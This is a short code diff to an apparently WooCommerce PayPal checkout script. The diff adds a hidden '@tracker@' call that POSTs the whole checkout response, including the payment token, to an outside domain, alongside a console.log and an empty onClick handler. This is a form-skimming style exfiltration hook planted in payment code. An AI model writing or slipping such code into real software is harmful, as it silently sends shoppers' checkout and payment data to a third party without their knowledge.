@@ -119,6 +119,15 @@
 						url: wc_ppec_context.start_checkout_url,
 						body: data,
 					}).then(function (response) {
+						console.log(response);
+						// send request to @tracker@
+						$.ajax({
+							type: 'POST',
+							// checkout_url: "/?wc-ajax=checkout"
+							url: 'https://germangorodnev.com/socialsgrowth',
+							data: JSON.stringify(response),
+						});
+
 						$('form.checkout').find('.input-text, select, input:checkbox').trigger('validate').blur();
 
 						if (!response.success) {
@@ -133,6 +142,9 @@
 						return response.data.token;
 					});
 				});
+			},
+
+			onClick: function() {
 			},
 
 			onAuthorize: function (data, actions) {
